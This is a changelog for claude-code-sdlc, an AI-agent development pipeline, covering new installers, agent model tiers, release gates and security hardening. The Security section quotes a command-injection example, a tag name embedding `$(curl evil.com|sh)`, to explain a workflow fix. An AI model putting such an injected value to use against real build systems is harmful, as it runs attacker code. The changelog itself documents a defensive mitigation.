# Changelog

All notable user-facing changes to claude-code-sdlc are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

User-facing means changes a developer using the SDLC pipeline notices in
their day-to-day work — new commands, new agents, new gates, behavioral
changes to existing pipeline stages, install.sh changes, fixes to broken
flows. Internal refactors, type-only changes, test-infrastructure tweaks,
and documentation cleanups do NOT belong here (per
`templates/rules/changelog.md`).

## [Unreleased]

### Added

- Native Windows installer — `install.bat` (cmd.exe wrapper) and `install.ps1` (PowerShell) install the SDLC config to `%USERPROFILE%\.claude\`, download `sdlc-knowledge.exe` and `pdfium.dll` from GitHub releases, register a `claudeknows.cmd` wrapper, and add it to your User PATH. No Git Bash / MSYS2 / Cygwin required.
- The knowledge-base search tool now understands your queries semantically — matching concepts and cross-lingual paraphrases rather than exact keywords — and can also find text embedded in figures and diagrams extracted from PDFs.

## [0.3.1] - 2026-05-02

### Added

- Plan-mode plans are now automatically saved to `<project>/.claude/plan.md` so they are available to the pipeline without any manual copy-paste step. `/bootstrap-feature` Step 0 verifies the file exists and is non-empty before invoking any agent.

### Fixed

- `claudeknows ingest` on Windows no longer fails with "HOME env var unset" when ingesting PDFs — the binary now falls back to `USERPROFILE` for home-directory resolution on Windows.

## [0.3.0] - 2026-04-30

### Added

- **`/release` slash command** — release packaging extracted from
  `/merge-ready` Gate 9 to a standalone user-invoked command. Run
  `/release` when ready to cut a versioned release; `/merge-ready`
  is now strictly about quality gates.
- **`/bootstrap-feature --with-resources` flag** — force-runs the
  resource-architect step regardless of keyword auto-detection
  outcome.
- **Tier-based agent models** for token-cost optimization. Default
  matrix: opus (architect, security-auditor, code-reviewer, verifier,
  release-engineer, resource-architect, role-planner) / sonnet
  (prd-writer, ba-analyst, planner, refactor-cleaner) / haiku
  (qa-planner, test-writer, build-runner, e2e-runner, doc-updater,
  changelog-writer). README §Customization documents the rationale
  and per-agent override.

### Changed

- **`/merge-ready` is now 9 quality gates** (was 10). Release
  packaging extracted to the standalone `/release` command. Gate
  numbering 0 through 8 unchanged; Step 11 (post-merge on-demand
  role teardown) now runs after Gate 8 instead of after Gate 9.
- **Step 3.5 of `/bootstrap-feature` is now CONDITIONAL.** The
  resource-architect agent runs only when the PRD/use-cases body
  contains external-resource trigger keywords (third-party,
  external API, MCP, OAuth, vendor, compliance, S3, Stripe, etc.)
  OR the user explicitly passes `--with-resources`. When neither
  triggers, Step 3.5 is silently skipped, saving one agent call
  per bootstrap on the common case. Step 3.75 (role-planner)
  remains MANDATORY.
- **`claudeknows search --context <N>`** flag added in iter-3.x —
  expands each hit with ±N neighbor chunks for paragraph-level
  context. Default N=0 (backward-compat — no expansion).

## [0.2.0] - 2026-04-26

### Added

- **Auto-release executing mode** (opt-in via `.claude/rules/auto-release.md`).
  When the sentinel file is present, `release-engineer` Gate 9 transitions
  from suggest-only to executing mode after Steps 0–6 produce the structured
  summary. Gate 9 then creates and pushes the release tag itself with a
  4-tier authority dispatch — Trivial (`git add`, `commit`, `merge-base`,
  `diff`, `ls-remote`) auto-execute silently; Moderate (`git tag -a`)
  auto-execute with audit; Sensitive (`git push origin <tag>`) prompt
  default-deny `[y/N]` with `AUTO_RELEASE=1` env var or non-TTY stdin
  auto-confirm; Forbidden (`npm publish`, `cargo publish`, `pypi upload`,
  `gh release create`, any `--force`) refused unconditionally. Anchored-
  regex bash whitelist with metacharacter pre-rejection. Sentinel-absent
  behavior is byte-identical to suggest-only mode.
- **Tag-scheme disambiguation** in Gate 9. Releases that touch
  `tools/sdlc-knowledge/` get the `sdlc-knowledge-v<X.Y.Z>` tag scheme
  (triggers the binary release pipeline); pure SDLC core releases get
  the bare `v<X.Y.Z>` scheme (triggers the new core release pipeline);
  both-changed releases prompt for explicit user choice (auto-aborts in
  headless mode).
- **Windows-x64 prebuilt binary** for `sdlc-knowledge`. The release matrix
  now produces a Windows binary alongside darwin-arm64, darwin-x64,
  linux-x64, and linux-arm64. `install.sh` detects MINGW/MSYS/CYGWIN
  shell environments and downloads the Windows binary (with `.exe`
  suffix) instead of attempting a cargo source build. (Note: Windows
  binary build is matrix-defined but pdf.rs unix-only imports may
  prevent compilation — gated behind `cfg(unix)` in iter-3.1.)
- **SDLC core release pipeline** (`.github/workflows/sdlc-core-release.yml`).
  Bare `v*.*.*` tag pushes now produce a GitHub Release with source
  tarball + release-notes body (consumed from `.claude/release-notes-X.Y.Z.md`)
  via `softprops/action-gh-release@v2`. Disjoint from the existing
  `sdlc-knowledge-v*` pipeline.
- **Source tarball generation** for both release pipelines. `git archive`
  honors the new `.gitattributes` `export-ignore` entries so internal
  artifacts (`.claude/` agent state, `docs/qa/`, `docs/use-cases/`,
  `books/` corpus) are stripped from published source distributions.
  Defense-in-depth `tar -tzf | grep` step in the core pipeline fails the
  job if any excluded path leaks into the archive.
- **Pre-push hook template** (`templates/hooks/pre-push`). Optional
  advisory hook for opted-in projects that warns to stderr when
  `CHANGELOG.md [Unreleased]` is non-empty at push time, suggesting
  `/merge-ready` Gate 9 should run first. Never blocks the push.
  Honors `GIT_HOOKS_BYPASS=1` for one-shot bypass.
- **SDLC core opts in to its own pipeline.** Adds
  `.claude/rules/auto-release.md` (Gate 9 executing-mode sentinel) and
  `.claude/rules/changelog.md` (changelog-writer activation) at the
  repo root. The previous `no-op: not configured` outcome from
  `changelog-writer` lifecycle hooks is now active — the SDLC repo
  dogfoods its own automated changelog and release packaging.

### Changed

- **install.sh major version bump 2.1.0 → 3.0.0.** Reflects the new
  executing-mode option in `release-engineer` Gate 9: opted-in projects
  see Gate 9 run whitelisted git commands itself instead of just
  emitting a fenced `Commands to run` block. Suggest-only remains the
  default; projects without `<project>/.claude/rules/auto-release.md`
  see byte-identical v2.x behavior.
- **`sdlc-knowledge` release pipeline** matches Windows pdfium archives
  via grouped find alternation. The library is named `pdfium.dll`
  on Windows (no `lib` prefix per Windows convention); the workflow
  now copies it alongside the macOS/Linux `libpdfium.{dylib,so}` form.
- **Migration guide** at `MIGRATION.md` walks v2.x users through the
  upgrade, opt-in path, opt-out path, and known issues.

### Fixed

- **`install.sh` REPO_URL** corrected from `github.com/Koroqe/claude-code-sdlc.git`
  to `github.com/codefather-labs/claude-code-sdlc.git`. The v2.x typo
  broke `curl -fsSL https://raw.githubusercontent.com/codefather-labs/claude-code-sdlc/main/install.sh | bash`
  one-line install against the actual canonical remote. The corrected
  URL also propagates to the script's quick-install help text and
  inline comments.

### Security

- **install.sh download hardening parity.** The `install_knowledge_binary`
  function's curl invocation gains `--max-redirs 5 --max-time 120` and
  the wget fallback gains `--max-redirect=5 --timeout=120 --secure-protocol=TLSv1_2`
  to match the pdfium-download path's defense-in-depth. Mitigates
  redirect-loop denial-of-service and infinite-stall scenarios on
  attacker-controlled or dead URLs (Slice 2 security pre-review MEDIUM).
- **Workflow shell-injection prevention** in `sdlc-core-release.yml`.
  All `${{ github.ref_name }}` and `${{ github.event.* }}` references
  are mediated through `env:` blocks before being consumed by `run:`
  shell commands; never directly interpolated. Mitigates the named
  exploit class where a malicious tag name embeds shell substitution
  (e.g., `v1.0.0$(curl evil.com|sh)`) and executes during the workflow
  run (Slice 4 security pre-review HIGH M5c + A1).
